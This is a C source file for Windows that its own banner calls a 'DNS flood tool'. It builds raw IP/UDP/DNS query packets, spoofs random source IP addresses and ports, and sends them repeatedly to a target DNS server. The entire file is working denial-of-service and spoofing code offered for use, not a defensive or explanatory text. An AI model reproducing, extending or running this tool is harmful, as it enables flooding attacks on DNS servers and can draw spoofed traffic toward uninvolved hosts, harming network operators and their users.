// Module Name: dns.c
//
// Note: some memory leak bugs ;)
//
// Win32:
//	Compile:
//    cl -o dns dns.c ws2_32.lib 
// UNIX:
//
// Command Line Parameters/Arguments:
//    dns [-fp:int] [-fi:str] [-tp:int] [-ti:str] [-n:int] [-h:str]
//
//           -fp:int   From (sender) port number
//           -fi:IP    From (sender) IP address
//           -tp:int   To (recipient) port number
//           -ti:IP    To (recipient) IP address
//           -n:int    Number of times to send message
//           -h:str    Host name for resolve
//
#pragma pack(1)

#define WIN32_LEAN_AND_MEAN 

#include <winsock2.h>
#include <ws2tcpip.h>

// for ip helper functions
#define	_IP_HELPER

#ifdef	_IP_HELPER
	#include <iphlpapi.h>
	#pragma comment (lib, "iphlpapi.lib")
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>

#define MAX_MESSAGE        256
#define MAX_PACKET         8000

//
// Setup some default values 
//
#define DEFAULT_PORT       53
#define DEFAULT_IP         "10.0.0.1"
#define DEFAULT_COUNT      5
#define DEFAULT_HOST	   "ya.ru"
#define DEFAULT_TYPE		1 // A-TYPE

//
// Define the IP header. Make the version and length field one
// character since we can't declare two 4 bit fields without
// the compiler aligning them on at least a 1 byte boundary.
//
typedef struct ip_hdr
{
    unsigned char  ip_verlen;        // IP version & length
    unsigned char  ip_tos;           // IP type of service
    unsigned short ip_totallength;   // Total length
    unsigned short ip_id;            // Unique identifier 
    unsigned short ip_offset;        // Fragment offset field
    unsigned char  ip_ttl;           // Time to live
    unsigned char  ip_protocol;      // Protocol(TCP,UDP etc)
    unsigned short ip_checksum;      // IP checksum
    unsigned int   ip_srcaddr;       // Source address
    unsigned int   ip_destaddr;      // Destination address
} IP_HDR, *PIP_HDR, FAR* LPIP_HDR;

//
// Define the UDP header 
//
typedef struct udp_hdr
{
    unsigned short src_portno;       // Source port number
    unsigned short dst_portno;       // Destination port number
    unsigned short udp_length;       // UDP packet length
    unsigned short udp_checksum;     // UDP checksum (optional)
} UDP_HDR, *PUDP_HDR;


//
// Define the DNS header
//
typedef struct dns_hdr {
	unsigned short int id;			// Unique identifier 

	unsigned char  rd:1;           // recursion desired 
	unsigned char  tc:1;           // truncated message 
	unsigned char  aa:1;           // authoritive answer 
	unsigned char  opcode:4;       // purpose of message 
	unsigned char  qr:1;           // response flag 

	unsigned char  rcode:4;        // response code 
	unsigned char  unused:2;       // unused bits 
	unsigned char  pr:1;           // primary server required (non standard) 
	unsigned char  ra:1;           // recursion available 

	unsigned short int que_num;		// question records
	unsigned short int rep_num;		// answer records
	unsigned short int num_rr;		// authority records
	unsigned short int num_rrsup;	// additional records
} DNS_HDR, *PDNS_HDR;

//
// Define the DNS question section 
//
typedef struct dns_question_hdr{
	unsigned short int type;
	unsigned short 	int cl; // class
} DNS_QUESTION_HDR, *PDNS_QUESTION_HDR;

//
// Global variables
//
unsigned long  dwToIP,               // IP to send to
               dwFromIP;             // IP to send from (spoof)
unsigned short iToPort,              // Port to send to
               iFromPort,            // Port to send from (spoof)
			   iType;				 // Type of DNS request
DWORD          dwCount;              // Number of times to send
char           strHost[MAX_MESSAGE], // Host name
			   strToIP[MAX_MESSAGE]; // Default target
BOOL		   bRandomFromIP, 
			   bRandomFromPort;

//
// Function: usage:
//
// Description:
//    Print usage information and exit
//
void usage(char *progname)
{
    printf("usage: %s [-fp:int] [-fi:str] [-tp:int] [-ti:str]\
 [-n:int] [-tp:type] [-h:str]\n", progname);
	printf("		MaZaFaKa.Ru DNS flooooood tooool\n");
    printf("       -fp:int   From (sender) port number (Default: random)\n");
    printf("       -fi:IP    From (sender) IP address (Default: random)\n");
    printf("       -tp:int   To (dns server) port number (Default: %i)\n", DEFAULT_PORT);
    printf("       -ti:IP    To (dns server) IP address (Default: %s)\n", strToIP);
    printf("       -n:int    Number of times to send message (Default: %i)\n", DEFAULT_COUNT);
	printf("       -tp:int    Type field in DNS request (Default: 1 (A-TYPE))\n");
    printf("       -h:str    Host name to resolve (Default: %s)\n\n", DEFAULT_HOST);
    ExitProcess(1);
}

//
// Function:defaulttarget;
//
// Description:
//	Get information about default target
//
void defaulttarget (char *host)
{
	DWORD Err;

    PFIXED_INFO pFixedInfo;
    DWORD FixedInfoSize = 0;

	// get info from const:
	sprintf (host,  "%s", DEFAULT_IP);

#ifdef	_IP_HELPER
	//
    // Get the main IP configuration information for this machine using a FIXED_INFO structure
    //
    if ((Err = GetNetworkParams(NULL, &FixedInfoSize)) != 0)
        if (Err != ERROR_BUFFER_OVERFLOW)
        {
            printf("GetNetworkParams sizing failed with error %d\n", Err);
            return;
        }

    // Allocate memory from sizing information
    if ((pFixedInfo = (PFIXED_INFO) GlobalAlloc(GPTR, FixedInfoSize)) == NULL)
    {
        printf("Memory allocation error\n");
        return;
    }

    if ((Err = GetNetworkParams(pFixedInfo, &FixedInfoSize)) == 0)
		sprintf (host, "%s", pFixedInfo->DnsServerList.IpAddress.String);
#endif

}

//
// Function: nameformat;
//
// Description:
//		This function format host name for use in DNS request
//
void nameformat (char *host, char *data)
{
	char *tok;
	char temp[MAX_MESSAGE];

	tok = strtok (host, ".");

	while (tok != NULL)
	{

		sprintf (temp, "%c%s", strlen (tok), tok);
		tok = strtok (NULL, ".");
		strcat (data, temp);
	}
}

//
// Function: generatefakeip
//
// Description:
//		Generate fake from IP 
//
unsigned long generatefakeip (void)
{
	char ip[16];

	if (bRandomFromIP)
	{
		sprintf(ip,"%d.%d.%d.%d", rand ()%150+1, rand()%150+1, rand()%150+1, rand()%150+1);
		return inet_addr (ip);
	}

	return dwFromIP;
}

//
// Function: generatefakeport
//
// Description:
//		Generate fake source port number
//
unsigned short generatefakeport (void)
{
	if (bRandomFromPort)
		return rand ()%64511+1024;

	return iFromPort;
}	

//
// Function: ValidateArgs
//
// Description:
//    Parse the command line arguments and set some global flags to
//    indicate the actions to perform
//
void ValidateArgs(int argc, char **argv)
{
    int                i;

    iToPort = DEFAULT_PORT;
    dwCount = DEFAULT_COUNT;
	iType = DEFAULT_TYPE;
	dwFromIP = inet_addr(DEFAULT_IP); 
	iFromPort = 1025;
	bRandomFromIP = TRUE;
	bRandomFromPort = TRUE;


	defaulttarget (strToIP);
    dwToIP = inet_addr(strToIP);
	nameformat (DEFAULT_HOST, strHost);

    for(i = 1; i < argc; i++)
    {
        if ((argv[i][0] == '-') || (argv[i][0] == '/'))
        {
            switch (tolower(argv[i][1]))
            {
                case 'f':        // From address
                    switch (tolower(argv[i][2]))
                    {
                        case 'p':
                            if (strlen(argv[i]) > 4)
							{
                                iFromPort = atoi(&argv[i][4]);
								bRandomFromPort = FALSE;
							}
                            break;
                        case 'i':
                            if (strlen(argv[i]) > 4)
							{
                                dwFromIP = inet_addr(&argv[i][4]);
								bRandomFromIP = FALSE;
							}
                            break;
                        default:
                            usage(argv[0]);
                            break;
                    }    
                    break;
                case 't':        // To address 
                    switch (tolower(argv[i][2]))
                    {
                        case 'p':
                            if (strlen(argv[i]) > 4)
                                iToPort = atoi(&argv[i][4]);
                            break;
                        case 'i':
                            if (strlen(argv[i]) > 4){
								strcpy (strToIP, &argv[i][4]);
                                dwToIP = inet_addr(&argv[i][4]);
							}
                            break;
                        default:
                            if (strlen(argv[i]) > 3)
								iType = atol(&argv[i][3]);
                            break;
                    }    
                    break;
                case 'n':        // Number of times to send message
                    if (strlen(argv[i]) > 3)
                        dwCount = atol(&argv[i][3]);
                    break;
                case 'h':
                    if (strlen(argv[i]) > 3){
						printf("Host: [%s]\n", &argv[i][3]);
						ZeroMemory (strHost, MAX_MESSAGE);
						nameformat (&argv[i][3], strHost);
					}
                    break;
                default:
                    usage(argv[0]);
                    break;
            }
        }
    }
    return;
}


// 
// Function: checksum
//
// Description:
//    This function calculates the 16-bit one's complement sum
//    for the supplied buffer
//
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1)
    {
        cksum += *buffer++;
        size  -= sizeof(USHORT);   
    }
    if (size)
    {
        cksum += *(UCHAR*)buffer;   
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16); 

    return (USHORT)(~cksum); 
}

//
// Function: generatednsrequest
//
// Description:
//		Generate and send DNS packet
//
int generatednsrequest (SOCKET s)
{
	IP_HDR             ipHdr;
    UDP_HDR            udpHdr;
	DNS_HDR			   dnsHdr;
	DNS_QUESTION_HDR   dnsQuestion;	
    struct sockaddr_in remote;       // IP addressing structures
	unsigned short     iTotalSize,   // Lots of sizes needed to fill
                       iUdpSize,     // the various headers with
                       iUdpChecksumSize,
                       iIPVersion,
                       iIPSize,
                       cksum = 0;
    char               buf[MAX_PACKET],
                      *ptr = NULL;
	DWORD              i;    

	// Initalize the IP header
    //
    iTotalSize = sizeof(ipHdr) + sizeof(udpHdr) + sizeof(dnsHdr)+strlen (strHost) + sizeof (dnsQuestion)+1;

    iIPVersion = 4;
    iIPSize = sizeof(ipHdr) / sizeof(unsigned long);
    ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
    ipHdr.ip_tos = 0;                         // IP type of service
    ipHdr.ip_totallength = htons(iTotalSize); // Total packet len
    ipHdr.ip_id = rand()%255;                 // Unique identifier
    ipHdr.ip_offset = 0;             // Fragment offset field
    ipHdr.ip_ttl = 128;              // Time to live
    ipHdr.ip_protocol = 0x11;        // Protocol(UDP) 
    ipHdr.ip_checksum = 0 ;          // IP checksum
    ipHdr.ip_srcaddr = generatefakeip();     // Source address
    ipHdr.ip_destaddr = dwToIP;      // Destination address
    
	//
    // Initalize the UDP header
    //
    iUdpSize = sizeof(udpHdr) + sizeof(dnsHdr)+strlen (strHost) + sizeof (dnsQuestion)+1;
    udpHdr.src_portno = htons(generatefakeport()) ;
    udpHdr.dst_portno = htons(iToPort) ;
    udpHdr.udp_length = htons(iUdpSize) ;
    udpHdr.udp_checksum = 0 ;

	//
	// Initalize the DNS header
	//	Format:
	//		DNS Header
	//		Question Record:
	//			Host name
	//			question struct
	//
	dnsHdr.id	=	htons (rand()%16);
	dnsHdr.qr	=	0; // qr = 0: question packet
	dnsHdr.aa	=	0; //  aa = 0: not auth answer
	dnsHdr.rd	=	1;
	dnsHdr.opcode = 0;
	dnsHdr.que_num = htons(1); // question records
	dnsHdr.rep_num = htons(0); // sending no replies
	dnsHdr.num_rr  = htons(0); // authority records
	dnsHdr.num_rrsup = htons (0); //additional records
    
	//
	// Initalize DNS Question Section:
	//
	dnsQuestion.type = htons (iType);
	dnsQuestion.cl   = htons (1); 

	// 
    // Build the UDP pseudo-header 
    //
    iUdpChecksumSize = 0;
    ptr = buf;
    ZeroMemory(buf, MAX_PACKET);

    memcpy(ptr, &ipHdr.ip_srcaddr,  sizeof(ipHdr.ip_srcaddr));  
    ptr += sizeof(ipHdr.ip_srcaddr);
    iUdpChecksumSize += sizeof(ipHdr.ip_srcaddr);

    memcpy(ptr, &ipHdr.ip_destaddr, sizeof(ipHdr.ip_destaddr)); 
    ptr += sizeof(ipHdr.ip_destaddr);
    iUdpChecksumSize += sizeof(ipHdr.ip_destaddr);

    ptr++;
    iUdpChecksumSize += 1;

    memcpy(ptr, &ipHdr.ip_protocol, sizeof(ipHdr.ip_protocol)); 
    ptr += sizeof(ipHdr.ip_protocol);
    iUdpChecksumSize += sizeof(ipHdr.ip_protocol);

    memcpy(ptr, &udpHdr.udp_length, sizeof(udpHdr.udp_length)); 
    ptr += sizeof(udpHdr.udp_length);
    iUdpChecksumSize += sizeof(udpHdr.udp_length);
    
    memcpy(ptr, &udpHdr, sizeof(udpHdr)); 
    ptr += sizeof(udpHdr);
    iUdpChecksumSize += sizeof(udpHdr);

	memcpy (ptr, &dnsHdr, sizeof (dnsHdr));
	ptr += sizeof (dnsHdr);
	iUdpChecksumSize += sizeof(dnsHdr);

    for(i = 0; i < strlen(strHost); i++, ptr++)
        *ptr = strHost[i];
	ptr++;
    iUdpChecksumSize += strlen(strHost)+1;
	

	memcpy (ptr, &dnsQuestion, sizeof (dnsQuestion));
	ptr += sizeof (dnsQuestion);
	iUdpChecksumSize += sizeof(dnsQuestion);

    cksum = checksum((USHORT *)buf, iUdpChecksumSize);
    udpHdr.udp_checksum = cksum;

    //
    // Now assemble the IP,UDP and DNS headers 
    //        
    ZeroMemory(buf, MAX_PACKET);
    ptr = buf;

    memcpy(ptr, &ipHdr, sizeof(ipHdr));   ptr += sizeof(ipHdr);
    memcpy(ptr, &udpHdr, sizeof(udpHdr)); ptr += sizeof(udpHdr);
	memcpy(ptr, &dnsHdr, sizeof(dnsHdr)); ptr += sizeof(dnsHdr);
	memcpy(ptr, strHost, strlen (strHost)+1); ptr += (strlen (strHost)+1);
	memcpy(ptr, &dnsQuestion, sizeof(dnsQuestion)); 

    // Apparently, this SOCKADDR_IN structure makes no difference.
    // Whatever we put as the destination IP addr in the IP header
    // is what goes. Specifying a different destination in remote
	 // will be ignored.
    //
    remote.sin_family = AF_INET;
    remote.sin_port = htons(iToPort);
    remote.sin_addr.s_addr = dwToIP;

	return sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote, sizeof(remote));
}


// 
// Function: main
//
// Description:
//    First parse command line arguments and load Winsock. Then 
//    create the raw socket and set the IP_HDRINCL option.
//    Following this, assemble the IP and UDP packet headers by
//    assigning the correct values and calculating the checksums.
//    Then fill in the data and send to its destination.
//
int main(int argc, char **argv)
{
    WSADATA            wsd;
    SOCKET             s;
    BOOL               bOpt;
    int                ret;    
    DWORD              i;    
    IN_ADDR            addr;

    // Parse command line arguments and print them out
    //
    ValidateArgs(argc, argv);

	srand(GetTickCount());

    addr.S_un.S_addr = dwFromIP;
    printf("From IP: <%s>\n     Port: %d\n", inet_ntoa(addr), iFromPort);
    
	addr.S_un.S_addr = dwToIP;
    printf("To   IP: <%s>\n     Port: %d\n", inet_ntoa(addr), iToPort);

    
    printf("Count:   %d\n", dwCount);
	printf("Type:	%d\n", iType); 

	// Init WSA
	//
    if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
    {
        printf("WSAStartup() failed: %d\n", GetLastError());
        return -1;
    }

    //  Creating a raw socket
    //
    s = WSASocket(AF_INET, SOCK_RAW, IPPROTO_UDP, NULL, 0,0);
    if (s == INVALID_SOCKET)
    {
        printf("WSASocket() failed: %d\n", WSAGetLastError());
        return -1;
    }

    // Enable the IP header include option 
    //
    bOpt = TRUE;
    ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
    if (ret == SOCKET_ERROR)
    {
        printf("setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
        return -1;
    }

    for(i = 0; i < dwCount; i++)
    {
        ret = generatednsrequest (s);
        if (ret == SOCKET_ERROR)
        {
            printf("sendto() failed: %d\n", WSAGetLastError());
            break;
        }
        else
            printf("sent %d bytes\n", ret);
    }


    closesocket(s) ;
    WSACleanup() ;

    return 0;
}
